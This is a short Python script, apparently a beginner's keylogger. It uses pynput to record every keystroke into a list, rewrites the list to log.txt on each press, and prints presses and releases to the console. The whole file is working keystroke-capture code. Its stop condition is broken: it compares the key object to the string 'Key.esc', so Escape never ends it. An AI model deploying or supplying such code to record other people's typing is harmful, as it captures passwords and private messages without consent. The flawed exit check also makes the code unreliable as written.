import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(Key):
    keys.append(Key)
    write_file(keys)

    try:
        print("alphanumeric key {0} pressed".format(Key.char))
    except AttributeError:
        print('special key {0} pressed'.format(Key))

def write_file(keys):
    with open('log.txt','w') as f:
        for Key in keys:
            k = str(Key).replace("'", "")
            f.write(k)

            f.write(' ')

def on_release(Key):
    print('{0} released'.format(Key))
    if Key == 'Key.esc':
        return False

with Listener(on_press=on_press,
                on_release=on_release) as Listener:
    Listener.join()